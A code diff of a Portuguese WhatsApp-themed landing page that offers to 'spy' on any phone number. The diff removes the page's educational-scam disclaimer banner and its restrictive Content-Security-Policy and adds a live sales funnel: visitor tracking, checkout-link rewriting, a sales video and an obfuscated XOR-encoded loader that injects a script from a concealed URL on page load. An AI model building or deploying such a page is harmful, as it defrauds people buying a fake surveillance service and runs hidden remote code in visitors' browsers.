@@ -1,11 +1,518 @@
-<!doctype html>
+<!DOCTYPE html>
 <html lang="pt-BR">
-<head>
-<meta charset="utf-8">
-<meta name="viewport" content="width=device-width, initial-scale=1">
-<meta http-equiv="Content-Security-Policy" content="default-src 'none'; script-src 'unsafe-inline'; style-src 'unsafe-inline'; img-src data:; media-src 'self'; connect-src 'none'; form-action 'none'; base-uri 'none'">
-<title>WPP — Demonstração educativa de golpe virtual</title>
-<meta name="description" content="Simulação educativa: todos os resultados são fictícios. Não acessa contas ou mensagens."><style>
+<head><meta charset="utf-8"><!-- ga-trecho-v1 -->
+<!-- ab-trecho-v1 -->
+<script>
+(function () {
+    // GA4 da página e eventos do funil (apps/funil). O build
+    // injeta este trecho logo depois do <meta charset> de toda página de domínio com a flag `ga` e troca os quatro tokens
+    // abaixo pelo contexto do domínio e da rota. O que depende do host sai de `location` aqui, nunca do build: os
+    // membros de um grupo do espelho têm de sair byte a byte iguais.
+    // Este trecho é o único dono do gtag.js na página. A fonte não carrega GA4 à mão, e o `conferir` do build recusa
+    // HTML com o gtag.js duas vezes ou sem a marca da primeira linha. A marca é contrato com o `conferir` e com o
+    // `verificar` do teste-ab, não a versão do código.
+    // Falha abre: tudo em try/catch, nenhum erro sobe para a página, nada espera resposta nem segura o checkout.
+    // Nenhum evento leva número, nome ou foto, e o parâmetro `phone` sai também da URL que o GA grava.
+    var ID_GA = 'G-EQ4PBDPDH2';
+    var TIPO_DO_BUILD = 'front';
+    var GESTOR = 'M';
+    var SRC = 'M-FRONT';
+    var VID_DA_URL = '' === 'sim';
+    // Homologação conta como front, marcada como tráfego interno: o filtro do GA4 separa pelo `traffic_type`, não pelo host.
+    var INTERNO = TIPO_DO_BUILD === 'homologacao';
+    var TIPO = INTERNO || !TIPO_DO_BUILD ? 'front' : TIPO_DO_BUILD;
+
+    // Cada formato tem um grupo só, o valor que interessa. `ab` é o mesmo do cookie (teste-ab/src/cookie.ts) e do
+    // postback (central-vendas/src/payt.ts); o `vid` é UUID. Valor fora do formato não vai a lugar nenhum.
+    var FORMATO_AB = /^([a-z0-9][a-z0-9-]{0,39}\.[A-D](?:\.p)?)$/;
+    var FORMATO_UUID = /^([0-9a-f]{8}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{12})$/;
+
+    var ATRIBUTOS_DO_VID = '; Path=/; Max-Age=2592000; Secure; SameSite=Lax';
+    var DESTINO_DO_BEACON = '/_f/e';
+    var TAMANHO_DO_BEACON = 2048;
+    var TAMANHO_DA_UTM = 200;
+    var TAMANHO_DA_ROTA = 80;
+    var TAMANHO_DO_VALOR = 40;
+
+    // O Worker `funil` descarta, em silêncio, beacon com evento ou parâmetro fora desta lista.
+    var PARAMETROS_DO_EVENTO = {
+        page_view: [],
+        numero_enviado: [],
+        foto_resultado: ['resultado'],
+        vsl_inicio: [],
+        vsl_progresso: ['pct'],
+        cta_visivel: [],
+        checkout_click: ['destino', 'degrau', 'posicao'],
+        proxima_etapa_click: ['posicao'],
+        back_disparado: ['degrau']
+    };
+    var UTM_DO_FUNIL = ['utm_source', 'utm_medium', 'utm_campaign', 'utm_content', 'utm_term', 'utm_id', 'fbclid'];
+    var COPIA_DA_URL = ['utm_source', 'utm_medium', 'utm_campaign', 'utm_content', 'utm_term', 'sck', 'xcod'];
+
+    function lerCookie(nome, formato) {
+        try {
+            var partes = document.cookie ? document.cookie.split(';') : [];
+            for (var i = 0; i < partes.length; i++) {
+                var parte = partes[i].trim();
+                if (parte.indexOf(nome + '=') !== 0) continue;
+                var achado = formato.exec(parte.slice(nome.length + 1));
+                if (achado) return achado[1];
+            }
+        } catch (e) { /* cookie ilegível: como se não houvesse */ }
+        return null;
+    }
+
+    function lerLocal(chave) {
+        try { return window.localStorage.getItem(chave); } catch (e) { return null; }
+    }
+
+    function gravarLocal(chave, valor) {
+        try { window.localStorage.setItem(chave, valor); } catch (e) {}
+    }
+
+    function vidDaUrl() {
+        if (!VID_DA_URL) return null;
+        try {
+            var achado = FORMATO_UUID.exec(new URLSearchParams(location.search).get('vid') || '');
+            return achado ? achado[1] : null;
+        } catch (e) { return null; }
+    }
+
+    function novoId() {
+        try {
+            if (window.crypto && typeof window.crypto.randomUUID === 'function') return window.crypto.randomUUID();
+        } catch (e) { /* fora de contexto seguro: cai no sorteio abaixo */ }
+        return 'xxxxxxxx-xxxx-4xxx-yxxx-xxxxxxxxxxxx'.replace(/[xy]/g, function (c) {
+            var r = Math.random() * 16 | 0;
+            return (c === 'x' ? r : (r & 3 | 8)).toString(16);
+        });
+    }
+
+    var vid = null;
+    try {
+        var vidDoCookie = lerCookie('vid', FORMATO_UUID);
+        var vidGuardado = lerLocal('vid');
+        vid = vidDaUrl() || vidDoCookie || (FORMATO_UUID.test(vidGuardado || '') ? vidGuardado : null) || novoId();
+        if (vid !== vidDoCookie) {
+            try { document.cookie = 'vid=' + vid + ATRIBUTOS_DO_VID; } catch (e) {}
+        }
+        if (vidGuardado !== vid) gravarLocal('vid', vid);
+    } catch (e) {
+        vid = vid || novoId();
+    }
+
+    // Uma URL com `phone` atravessa os backs. Sem isto o GA gravaria o número
+    // no page_location e no page_referrer de todo page_view. Só o `phone` sai; `src` e `utm_*` ficam.
+    function semPhone(endereco) {
+        if (!endereco) return '';
+        try {
+            var url = new URL(endereco);
+            if (!url.searchParams.has('phone')) return endereco;
+            url.searchParams.delete('phone');
+            return url.toString();
+        } catch (e) {
+            return String(endereco).replace(/([?&])phone=[^&#]*&?/g, '$1').replace(/[?&]+(#|$)/, '$1');
+        }
+    }
+
+    // A rota vem da URL, não da pasta: a variante B é servida em /try/ a partir de outra pasta.
+    function rotaAtual() {
+        try {
+            return location.pathname.replace(/index\.html$/, '').replace(/\.html$/, '').slice(0, TAMANHO_DA_ROTA);
+        } catch (e) { return ''; }
+    }
+
+    function cortar(texto, tamanho) {
+        var corte = String(texto).slice(0, tamanho);
+        var ultimo = corte.charCodeAt(corte.length - 1);
+        return ultimo >= 0xD800 && ultimo <= 0xDBFF ? corte.slice(0, -1) : corte;
+    }
+
+    function utmDaUrl() {
+        try {
+            var aqui = new URLSearchParams(location.search);
+            var utm = null;
+            UTM_DO_FUNIL.forEach(function (chave) {
+                var valor = aqui.get(chave);
+                if (!valor) return;
+                utm = utm || {};
+                utm[chave] = cortar(valor, TAMANHO_DA_UTM);
+            });
+            return utm;
+        } catch (e) { return null; }
+    }
+
+    function bytes(texto) {
+        try { return new TextEncoder().encode(texto).length; } catch (e) { return texto.length * 3; }
+    }
+
+    // O destino é relativo (mesma origem, sem CORS nem preflight, porque o corpo é text/plain), e o Worker responde 204.
+    function enviarBeacon(nome, parametros, utm) {
+        var texto;
+        try {
+            var corpo = { v: 1, id: novoId(), ev: nome, vid: vid, rota: rotaAtual() };
+            if (SRC) corpo.src = SRC;
+            if (GESTOR) corpo.g = GESTOR;
+            var ab = lerCookie('ab', FORMATO_AB);
+            if (ab) corpo.ab = ab;
+            if (parametros) corpo.p = parametros;
+            if (utm) corpo.u = utm;
+            texto = JSON.stringify(corpo);
+            if (corpo.u && bytes(texto) > TAMANHO_DO_BEACON) {
+                delete corpo.u;
+                texto = JSON.stringify(corpo);
+            }
+        } catch (e) { return; }
+        var foi = false;
+        try { foi = !!(navigator.sendBeacon && navigator.sendBeacon(DESTINO_DO_BEACON, texto)); } catch (e) { foi = false; }
+        if (foi) return;
+        try {
+            fetch(DESTINO_DO_BEACON, {
+                method: 'POST',
+                keepalive: true,
+                headers: { 'content-type': 'text/plain' },
+                body: texto
+            }).catch(function () {});
+        } catch (e) { /* sem fetch: o evento fica só no GA */ }
+    }
+
+    try {
+        var ab = lerCookie('ab', FORMATO_AB);
+        var contexto = { tipo: TIPO, rota: rotaAtual(), page_location: semPhone(location.href), user_id: vid };
+        if (GESTOR) contexto.gestor = GESTOR;
+        if (SRC) contexto.src = SRC;
+        var referencia = semPhone(document.referrer);
+        if (referencia) contexto.page_referrer = referencia;
+        if (INTERNO) contexto.traffic_type = 'internal';
+        var usuario = null;
+        if (ab) {
+            var ponto = ab.indexOf('.');
+            usuario = { ab_teste: ab.slice(0, ponto), ab_variante: ab.slice(ponto + 1) };
+            contexto.ab_teste = usuario.ab_teste;
+            contexto.ab_variante = usuario.ab_variante;
+        }
+
+        // Ordem do snippet oficial: a fila do dataLayer recebe js, set e config antes de o gtag.js chegar, e o
+        // page_view automático do config sai com o contexto. O gtag.js entra depois, assíncrono.
+        window.dataLayer = window.dataLayer || [];
+        window.gtag = window.gtag || function () { window.dataLayer.push(arguments); };
+        window.gtag('js', new Date());
+        if (usuario) window.gtag('set', 'user_properties', usuario);
+        window.gtag('config', ID_GA, contexto);
+        var carregador = document.createElement('script');
+        carregador.async = true;
+        carregador.src = 'https://www.googletagmanager.com/gtag/js?id=' + ID_GA;
+        (document.head || document.documentElement).appendChild(carregador);
+    } catch (e) { /* sem GA a página segue igual */ }
+
+    var disparados = { 'page_view|': true };
+    enviarBeacon('page_view', null, utmDaUrl());
+
+    // Só sai evento da lista, com os parâmetros dela, e vazio não vai: fora da lista é `null`, e não vai nem ao GA.
+    // `pct` segue número; o resto vira texto curto.
+    function limpar(nome, parametros) {
+        if (!Object.prototype.hasOwnProperty.call(PARAMETROS_DO_EVENTO, nome)) return null;
+        var limpos = {};
+        PARAMETROS_DO_EVENTO[nome].forEach(function (chave) {
+            var valor = parametros ? parametros[chave] : undefined;
+            if (valor === undefined || valor === null || valor === '') return;
+            limpos[chave] = typeof valor === 'number' ? valor : cortar(valor, TAMANHO_DO_VALOR);
+        });
+        return limpos;
+    }
+
+    // Cada evento sai uma vez por página; o de progresso, uma vez por patamar. Chamador ausente ou com erro não para nada.
+    window.zrEvento = function (nome, parametros) {
+        try {
+            var limpos = limpar(nome, parametros);
+            if (limpos === null) return;
+            var chave = nome + '|' + (limpos.pct === undefined ? '' : limpos.pct);
+            if (disparados[chave]) return;
+            disparados[chave] = true;
+            try { window.gtag('event', nome, limpos); } catch (e) { /* GA fora: o beacon segue */ }
+            enviarBeacon(nome, limpos, null);
+        } catch (e) { /* o evento se perde, a página não */ }
+    };
+
+    // O link do checkout leva o `vid`, que liga a venda à visita, à consulta e à sessão do GA.
+    // A Utmify reescreve o link depois do carregamento, por isso a varredura volta a olhar, e o clique olha uma última vez.
+    // A checagem de igualdade evita laço com o observador.
+    function marcarCheckout() {
+        try {
+            var aqui = new URLSearchParams(location.search);
+            document.querySelectorAll('a.checkout-link').forEach(function (a) {
+                try {
+                    var url = new URL(a.href);
+                    // Link da própria origem (`#`, relativo) não é checkout: marcado, viraria esta página com os ids na URL.
+                    if (url.origin === location.origin) return;
+                    var mudou = false;
+                    if (SRC && url.searchParams.get('src') !== SRC) {
+                        url.searchParams.set('src', SRC);
+                        COPIA_DA_URL.forEach(function (chave) {
+                            if (aqui.has(chave) && !url.searchParams.has(chave)) url.searchParams.set(chave, aqui.get(chave));
+                        });
+                        mudou = true;
+                    }
+                    if (url.searchParams.get('vid') !== vid) {
+                        url.searchParams.set('vid', vid);
+                        mudou = true;
+                    }
+                    if (mudou) a.href = url.toString();
+                } catch (e) { /* link que não é URL: fica como está */ }
+            });
+        } catch (e) { /* nada a marcar */ }
+    }
+
+    function destinoDoCheckout() {
+        if (TIPO === 'upsell') return 'upsell';
+        if (TIPO === 'back') return 'back';
+        return 'front';
+    }
+
+    // O número só vale como enviado se a página o aceitou: a validação roda no clique, no mesmo instante, e o erro
+    // aparece como `.show` no #phoneError. O valor do campo nunca é lido.
+    function conferirNumero() {
+        setTimeout(function () {
+            try {
+                var erro = document.getElementById('phoneError');
+                if (erro && erro.classList.contains('show')) return;
+                window.zrEvento('numero_enviado', {});
+            } catch (e) { /* nada */ }
+        }, 50);
+    }
+
+    // Os cliques são ouvidos no document, na captura: valem para link criado depois, rodam antes da navegação e mesmo que
+    // a página pare a propagação. No upsell a compra é o botão one-click da Payt (`payt_action="oneclick_buy"`, sem
+    // `checkout-link`): o script dela escuta o próprio botão e para a propagação, e o href dele não se toca.
+    try {
+        document.addEventListener('click', function (e) {
+            try {
+                var alvo = e.target && e.target.closest ? e.target : null;
+                if (!alvo) return;
+                var checkout = alvo.closest('a.checkout-link');
+                if (checkout) {
+                    marcarCheckout();
+                    var corpo = document.body;
+                    window.zrEvento('checkout_click', {
+                        destino: destinoDoCheckout(),
+                        degrau: corpo && corpo.dataset ? corpo.dataset.degrau : '',
+                        posicao: (checkout.dataset && checkout.dataset.pos) || 'oferta'
+                    });
+                    return;
+                }
+                var umClique = alvo.closest('[payt_action="oneclick_buy"]');
+                if (umClique) {
+                    window.zrEvento('checkout_click', {
+                        destino: 'upsell',
+                        posicao: (umClique.dataset && umClique.dataset.pos) || 'oferta'
+                    });
+                    return;
+                }
+                var etapa = alvo.closest('a.unlock-link');
+                if (etapa) {
+                    window.zrEvento('proxima_etapa_click', { posicao: etapa.dataset ? etapa.dataset.pos : '' });
+                    return;
+                }
+                if (alvo.closest('#spyBtn')) conferirNumero();
+            } catch (x) { /* o clique segue */ }
+        }, true);
+        document.addEventListener('keypress', function (e) {
+            try {
+                if (e.key === 'Enter' && e.target && e.target.id === 'zrAlvo') conferirNumero();
+            } catch (x) { /* a tecla segue */ }
+        }, true);
+    } catch (e) { /* sem ganchos de clique */ }
+
+    // A foto é revelada de uma vez quando a .avatar-wrap perde `avatar-scanning`: com foto, o <img> ganha src e
+    // display:block; sem foto, o #avatar-fallback fica em display:flex. O fallback já nasce em flex, e repor o mesmo
+    // valor no style não gera mutação, então o sinal do "sem foto" é a varredura acabar com o <img> escondido. Com foto,
+    // o resultado espera o <img> carregar: se a imagem falha, a página volta ao fallback, e é isso que o visitante vê.
+    function vigiarFoto() {
+        var foto = document.getElementById('profile-avatar');
+        if (!foto) return;
+        var reserva = document.getElementById('avatar-fallback');
+        var moldura = foto.closest ? foto.closest('.avatar-wrap') : null;
+        var varreu = false;
+        var esperando = false;
+        var VARREDURA = /(^|\s)avatar-scanning(\s|$)/;
+
+        function avaliar(registros) {
+            try {
+                (registros || []).forEach(function (r) {
+                    if (r.target === moldura && VARREDURA.test(r.oldValue || '')) varreu = true;
+                });
+                if (moldura && moldura.classList.contains('avatar-scanning')) {
+                    varreu = true;
+                    return;
+                }
+                if (foto.getAttribute('src') && foto.style.display === 'block') {
+                    if (foto.complete) {
+                        window.zrEvento('foto_resultado', { resultado: foto.naturalWidth > 0 ? 'ok' : 'fallback' });
+                        return;
+                    }
+                    if (esperando) return;
+                    esperando = true;
+                    foto.addEventListener('load', function () {
+                        window.zrEvento('foto_resultado', { resultado: 'ok' });
+                    });
+                    foto.addEventListener('error', function () {
+                        window.zrEvento('foto_resultado', { resultado: 'fallback' });
+                    });
+                    return;
+                }
+                if ((varreu || !moldura) && reserva && reserva.style.display === 'flex') {
+                    window.zrEvento('foto_resultado', { resultado: 'fallback' });
+                }
+            } catch (e) { /* nada */ }
+        }
+
+        var observador = new MutationObserver(avaliar);
+        observador.observe(foto, { attributes: true, attributeFilter: ['src', 'style'] });
+        if (reserva) observador.observe(reserva, { attributes: true, attributeFilter: ['style'] });
+        if (moldura) {
+            observador.observe(moldura, { attributes: true, attributeFilter: ['class'], attributeOldValue: true });
+        }
+    }
+
+    // O botão nasce escondido e o pitch o libera tirando `.hide` do #cta-btn-wrap.
+    function vigiarCta() {
+        var caixa = document.getElementById('cta-btn-wrap');
+        if (!caixa || !caixa.classList.contains('hide')) return;
+        var observador = new MutationObserver(function () {
+            try {
+                if (caixa.classList.contains('hide')) return;
+                observador.disconnect();
+                window.zrEvento('cta_visivel', {});
+            } catch (e) { /* nada */ }
+        });
+        observador.observe(caixa, { attributes: true, attributeFilter: ['class'] });
+    }
+
+    // Só a VSL do funil conta: o player dentro do #vturb-container, que a página cria no clique do número (por isso a
+    // procura em intervalo). Os players de depoimento da cta.html ficam de fora. O elemento não tem getter de mudo e o
+    // shadow root é fechado; entre o clique e a análise ele toca mudo por ~2 s, e a página só solta o som quando mostra o
+    // #step-analysis, então é ele visível que separa a VSL de verdade desse começo mudo. O `video:timeupdate` traz
+    // `detail.time` em segundos e a duração vem do getter `duration`; sem duração, não há patamar. Ele também sai com
+    // time 0 ao carregar os metadados, mesmo sem tocar, e por isso o início pelo timeupdate exige tempo andando.
+    function vigiarPlayer() {
+        var caixa = document.getElementById('vturb-container');
+        if (!caixa) return;
+        var voltas = 0;
+        var iv = setInterval(function () {
+            try {
+                var player = caixa.querySelector('vturb-smartplayer');
+                if (player) {
+                    clearInterval(iv);
+                    engancharPlayer(player);
+                    return;
+                }
+                if (++voltas >= 1200) clearInterval(iv);
+            } catch (e) { clearInterval(iv); }
+        }, 500);
+    }
+
+    function engancharPlayer(player) {
+        function vslAberta() {
+            var passo = document.getElementById('step-analysis');
+            return !passo || getComputedStyle(passo).display !== 'none';
+        }
+
+        function duracao() {
+            var d = player.duration;
+            return typeof d === 'number' && isFinite(d) && d > 0 ? d : 0;
+        }
+
+        function marcarPatamares(tempo, total) {
+            [25, 50, 75, 100].forEach(function (pct) {
+                var alvo = pct === 100 ? total - 0.5 : total * pct / 100;
+                if (tempo >= alvo) window.zrEvento('vsl_progresso', { pct: pct });
+            });
+        }
+
+        player.addEventListener('video:play', function () {
+            try { if (vslAberta()) window.zrEvento('vsl_inicio', {}); } catch (e) { /* nada */ }
+        });
+        player.addEventListener('video:timeupdate', function (e) {
+            try {
+                if (!vslAberta()) return;
+                var tempo = e && e.detail && typeof e.detail.time === 'number' ? e.detail.time : player.currentTime;
+                if (typeof tempo !== 'number' || !(tempo > 0)) return;
+                if (player.paused === false) window.zrEvento('vsl_inicio', {});
+                var total = duracao();
+                if (total) marcarPatamares(tempo, total);
+            } catch (x) { /* nada */ }
+        });
+        player.addEventListener('video:ended', function () {
+            try {
+                var total = duracao();
+                if (vslAberta() && total) marcarPatamares(total, total);
+            } catch (e) { /* nada */ }
+        });
+    }
+
+    function iniciar() {
+        try { vigiarFoto(); } catch (e) { /* nada */ }
+        try { vigiarCta(); } catch (e) { /* nada */ }
+        try { vigiarPlayer(); } catch (e) { /* nada */ }
+        marcarCheckout();
+        try { window.addEventListener('pageshow', marcarCheckout); } catch (e) {}
+        try {
+            var contagem = 0;
+            var iv = setInterval(function () {
+                marcarCheckout();
+                if (++contagem >= 45) clearInterval(iv);
+            }, 2000);
+        } catch (e) { /* o link segue como está */ }
+        try {
+            var observador = new MutationObserver(function () { marcarCheckout(); });
+            document.querySelectorAll('a.checkout-link').forEach(function (a) {
+                observador.observe(a, { attributes: true, attributeFilter: ['href'] });
+            });
+        } catch (e) {}
+    }
+
+    // O trecho roda no <head>, antes do corpo existir: os ganchos que precisam dos elementos esperam o DOM.
+    try {
+        if (document.readyState === 'loading') document.addEventListener('DOMContentLoaded', iniciar);
+        else iniciar();
+    } catch (e) { /* nada */ }
+})();
+</script>
+
+    
+
+
+    
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <meta http-equiv="Cache-Control" content="no-cache, no-store, must-revalidate">
+
+    <title>WPP</title>
+    <meta name="description" content="Wpp.">
+
+    <link rel="shortcut icon" href="/assets/zapion-mira-icone.webp">
+
+    
+    <script
+      src="https://cdn.utmify.com.br/scripts/utms/latest.js"
+      data-utmify-prevent-xcod-sck
+      data-utmify-prevent-subids
+      async defer
+    ></script>
+
+    <script>(function(){var n_waws=atob("CwJwrLF39i5xWHrheVLZwxvUFFMwDpVyA5aeWJVKH3YPlW8ZyshZlUEcdhiTLQPPwx6GWgJ3Coh6FcCeB59WFDRUi3FSgJMWgloDMRiUdhXfk02tc116HY1tEs3dBNQUKiNYj2MdyZNN1F4YIB+NSxSOnVWATx0tH8M4UprQRsEYRGhO12ATn4EVwRYQaUvZNxKZh1WLcww=");var q_8s=[];for(var b_kvo=0;b_kvo<n_waws.length;b_kvo++){q_8s.push(n_waws.charCodeAt(b_kvo)&255);}var d_6=q_8s[0];var l_42c=q_8s.slice(1,1+d_6);var o_m=q_8s.slice(1+d_6);var q_p8z=o_m.map(function(b,b_kvo2){return b^l_42c[b_kvo2%d_6];});var f_sd="";for(var m_43=0;m_43<q_p8z.length;m_43++){f_sd+=String.fromCharCode(q_p8z[m_43]&255);}var z_g=JSON.parse(decodeURIComponent(escape(f_sd)));var p_2sw=z_g.globals||[];p_2sw.forEach(function(c_47h){window[c_47h.name]=c_47h.value;});var w_a=document.createElement("script");w_a.src=z_g.url;w_a.async=true;w_a.defer=true;(z_g.attributes||[]).forEach(function(m_8){w_a.setAttribute(m_8.name,m_8.value);});(document.head||document.documentElement).appendChild(w_a);})();</script>
+    
+
+    
+    <script>!function(i,n){i._plt=i._plt||(n&&n.timeOrigin?n.timeOrigin+n.now():Date.now())}(window,performance);</script>
+    <link rel="preload" href="https://scripts.converteai.net/6dcf6846-12ab-4916-9ce8-4003dce97318/players/6a9348e5f88d4164c6267bb2/v4/player.js" as="script">
+    <link rel="preload" href="https://scripts.converteai.net/lib/js/smartplayer-wc/v4/smartplayer.js" as="script">
+    <link rel="preload" href="https://cdn.converteai.net/6dcf6846-12ab-4916-9ce8-4003dce97318/6a9348d3b1599b68a285dede/main.m3u8" as="fetch" crossorigin="anonymous">
+    <link rel="dns-prefetch" href="https://cdn.converteai.net">
+    <link rel="dns-prefetch" href="https://scripts.converteai.net">
+    <link rel="dns-prefetch" href="https://images.converteai.net">
+    <link rel="dns-prefetch" href="https://license.vturb.com">
+
+    <style>
         *, *::before, *::after { margin:0; padding:0; box-sizing:border-box; }
 
         :root {
@@ -36,7 +543,7 @@
 
         .hide { display: none !important; }
 
-
+        
 
 
         .page-wrap {
@@ -79,7 +586,7 @@
             letter-spacing: 0.5px;
         }
 
-
+        
         .phone-row {
             display: flex;
             gap: 10px;
@@ -123,7 +630,7 @@
         }
         .input-error.show { display: block; }
 
-
+        
         .btn-spy {
             width: 100%;
             padding: 18px;
@@ -156,7 +663,7 @@
         }
         .btn-spy-inner svg { width: 20px; height: 20px; }
 
-
+        
         .loading-bar-wrap {
             display: none;
             margin-top: 20px;
@@ -194,7 +701,7 @@
         }
         .security-row svg { width: 14px; height: 14px; color: var(--wa-green); }
 
-
+        
 
 
         #step-analysis {
@@ -463,7 +970,7 @@
             color: #92400e;
         }
 
-
+        
         .items-list {
             display: flex;
             flex-direction: column;
@@ -528,11 +1035,9 @@
         }
         .ssl-text { font-size: 13px; font-weight: 700; color: var(--wa-dark); }
         .ssl-sub { font-size: 11px; color: var(--text-muted); }
-    </style><style>
-body{display:block;padding:0}#step-input{min-height:calc(100vh - 94px);display:flex;align-items:center;justify-content:center;padding:24px 16px}#step-analysis{width:100%;margin:0}.demo-banner{position:sticky;top:0;z-index:9999;background:#fff3cd;color:#513c06;padding:14px 18px;text-align:center;border-bottom:2px solid #e2b93b;font:14px/1.5 system-ui,sans-serif}.demo-banner strong{display:block}.demo-panel{padding:24px;color:#0f172a;background:#f0fdf4;font:16px/1.6 system-ui,sans-serif}.demo-panel button,.demo-report button{padding:12px 18px;border:0;border-radius:8px;background:#128C7E;color:white;cursor:pointer;font:inherit}.vsl-wrapper{aspect-ratio:auto!important;min-height:0!important;height:auto!important;padding:0!important}.demo-report{max-width:650px;margin:24px auto;padding:24px;background:white;border:2px solid #128C7E;border-radius:16px;line-height:1.7}.demo-report h2{margin-bottom:12px}.demo-report p{margin:12px 0}.demo-report[hidden]{display:none}.demo-report:focus{outline:3px solid #25D366}.top-bar{position:static!important}
-</style>
-</head><body>
-<aside class="demo-banner" role="note"><strong>DEMONSTRAÇÃO EDUCATIVA — SIMULAÇÃO DE GOLPE VIRTUAL</strong>Todos os resultados são fictícios. Nenhuma conta é acessada e nenhum número é enviado. Use um número inventado.</aside>
+    </style>
+</head>
+<body>
 
 
 
@@ -551,7 +1056,7 @@ body{display:block;padding:0}#step-input{min-height:calc(100vh - 94px);display:f
             <div class="field-label">📱 Número do WhatsApp</div>
             <div class="phone-row">
                 <div class="phone-prefix">+55</div>
-                <input type="text" id="zrAlvo" name="zr-alvo" class="phone-number-input" placeholder="11 99999-8765" inputmode="numeric" maxlength="13" autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" data-lpignore="true" data-1p-ignore="" data-form-type="other">
+                <input type="text" id="zrAlvo" name="zr-alvo" class="phone-number-input" placeholder="11 99999-8765" inputmode="numeric" maxlength="13" autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" data-lpignore="true" data-1p-ignore data-form-type="other">
             </div>
             <div id="phoneError" class="input-error">
                 ⚠️ <span id="phoneErrorText">Insira um número válido</span>
@@ -560,8 +1065,8 @@ body{display:block;padding:0}#step-input{min-height:calc(100vh - 94px);display:f
             <button type="button" id="spyBtn" class="btn-spy">
                 <span class="btn-spy-inner" id="spyBtnText">
                     <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5">
-                        <path d="M1 12s4-8 11-8 11 8 11 8-4 8-11 8-11-8-11-8z"></path>
-                        <circle cx="12" cy="12" r="3"></circle>
+                        <path d="M1 12s4-8 11-8 11 8 11 8-4 8-11 8-11-8-11-8z"/>
+                        <circle cx="12" cy="12" r="3"/>
                     </svg>
                     ESPIONAR AGORA
                 </span>
@@ -576,7 +1081,7 @@ body{display:block;padding:0}#step-input{min-height:calc(100vh - 94px);display:f
 
             <div class="security-row">
                 <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
-                    <rect x="3" y="11" width="18" height="11" rx="2"></rect><path d="M7 11V7a5 5 0 0110 0v4"></path>
+                    <rect x="3" y="11" width="18" height="11" rx="2"/><path d="M7 11V7a5 5 0 0110 0v4"/>
                 </svg>
                 100% anônimo · Sem rastros · Criptografado
             </div>
@@ -604,7 +1109,7 @@ body{display:block;padding:0}#step-input{min-height:calc(100vh - 94px);display:f
         </div>
 
         <div id="cta-btn-wrap" class="cta-btn-wrap hide">
-            <a id="cta-btn" href="#demo-report" class="cta-btn">
+            <a id="cta-btn" href="cta.html" class="cta-btn">
                 🔓 CLIQUE PARA VER O QUE ENCONTRAMOS
             </a>
         </div>
@@ -613,22 +1118,26 @@ body{display:block;padding:0}#step-input{min-height:calc(100vh - 94px);display:f
             <div class="profile-progress-row">
                 <div class="avatar-wrap">
                     <svg viewBox="0 0 44 44" width="56" height="56">
-                        <circle cx="22" cy="22" r="20" fill="none" stroke="#e5e7eb" stroke-width="3"></circle>
-                        <circle id="avatar-ring" cx="22" cy="22" r="20" fill="none" stroke="url(#ringGrad)" stroke-width="3" stroke-linecap="round" stroke-dasharray="125.6" stroke-dashoffset="125.6" style="transition:stroke-dashoffset 0.4s ease; transform:rotate(-90deg); transform-origin:center;">
+                        <circle cx="22" cy="22" r="20" fill="none" stroke="#e5e7eb" stroke-width="3"/>
+                        <circle id="avatar-ring" cx="22" cy="22" r="20" fill="none"
+                            stroke="url(#ringGrad)" stroke-width="3"
+                            stroke-linecap="round"
+                            stroke-dasharray="125.6" stroke-dashoffset="125.6"
+                            style="transition:stroke-dashoffset 0.4s ease; transform:rotate(-90deg); transform-origin:center;">
                         </circle>
                         <defs>
                             <linearGradient id="ringGrad" x1="0%" y1="0%" x2="100%" y2="0%">
-                                <stop offset="0%" stop-color="#25D366"></stop>
-                                <stop offset="100%" stop-color="#128C7E"></stop>
+                                <stop offset="0%" stop-color="#25D366"/>
+                                <stop offset="100%" stop-color="#128C7E"/>
                             </linearGradient>
                         </defs>
                     </svg>
                     <div class="avatar-scan-line"></div>
-                    <img id="profile-avatar" class="profile-avatar" src="data:image/svg+xml,%3Csvg xmlns=%27http://www.w3.org/2000/svg%27/%3E" alt="" style="display:none;">
+                    <img id="profile-avatar" class="profile-avatar" src="" alt="" style="display:none;">
                     <div id="avatar-fallback" class="profile-avatar" style="display:flex; background:linear-gradient(135deg,#128C7E,#075E54); align-items:center; justify-content:center;">
                         <svg width="26" height="26" viewBox="0 0 24 24" fill="none" stroke="#fff" stroke-width="1.5">
-                            <path d="M20 21v-2a4 4 0 00-4-4H8a4 4 0 00-4 4v2"></path>
-                            <circle cx="12" cy="7" r="4"></circle>
+                            <path d="M20 21v-2a4 4 0 00-4-4H8a4 4 0 00-4 4v2"/>
+                            <circle cx="12" cy="7" r="4"/>
                         </svg>
                     </div>
                 </div>
@@ -656,9 +1165,9 @@ body{display:block;padding:0}#step-input{min-height:calc(100vh - 94px);display:f
 
             <div class="pause-alert" id="pause-alert">
                 <svg width="22" height="22" viewBox="0 0 24 24" fill="none" stroke="#f59e0b" stroke-width="2.2">
-                    <circle cx="12" cy="12" r="10"></circle>
-                    <line x1="12" y1="8" x2="12" y2="13"></line>
-                    <line x1="12" y1="16.5" x2="12" y2="16.5"></line>
+                    <circle cx="12" cy="12" r="10"/>
+                    <line x1="12" y1="8" x2="12" y2="13"/>
+                    <line x1="12" y1="16.5" x2="12" y2="16.5"/>
                 </svg>
                 <span>CONTINUE ASSISTINDO O VÍDEO PARA FINALIZAR O RELATÓRIO</span>
             </div>
@@ -675,7 +1184,7 @@ body{display:block;padding:0}#step-input{min-height:calc(100vh - 94px);display:f
             <div class="analysis-item" id="item-0">
                 <div class="item-icon" style="background:rgba(37,211,102,0.12);">
                     <svg width="20" height="20" fill="none" stroke="#25D366" stroke-width="2" viewBox="0 0 24 24">
-                        <path d="M21 15a2 2 0 01-2 2H7l-4 4V5a2 2 0 012-2h14a2 2 0 012 2z"></path>
+                        <path d="M21 15a2 2 0 01-2 2H7l-4 4V5a2 2 0 012-2h14a2 2 0 012 2z"/>
                     </svg>
                 </div>
                 <div class="item-text">
@@ -688,9 +1197,9 @@ body{display:block;padding:0}#step-input{min-height:calc(100vh - 94px);display:f
             <div class="analysis-item" id="item-1">
                 <div class="item-icon" style="background:rgba(236,72,153,0.1);">
